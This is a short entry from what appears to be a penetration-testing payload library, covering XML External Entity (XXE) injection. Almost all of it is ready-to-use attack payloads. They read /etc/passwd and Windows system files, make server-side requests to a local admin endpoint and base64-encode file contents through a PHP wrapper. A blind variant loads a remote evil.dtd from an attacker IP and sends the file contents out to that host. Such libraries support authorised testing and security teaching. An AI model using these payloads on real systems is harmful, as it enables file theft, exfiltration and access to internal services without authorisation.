---
description: |
  XML External Entity injection — read files, SSRF, and
  sometimes achieve RCE through XML parsing.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Basic XXE — read /etc/passwd
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>

  # XXE — read Windows files
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">

  # XXE — SSRF
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">

  # Blind XXE — exfiltrate via HTTP
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://10.10.14.1/evil.dtd">
  %dtd;

  # evil.dtd on attacker:
  <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.1/?data=%file;'>">
  %all;

  # PHP wrapper in XXE
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_Injection
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
  - https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/XXE%20Injection/
---
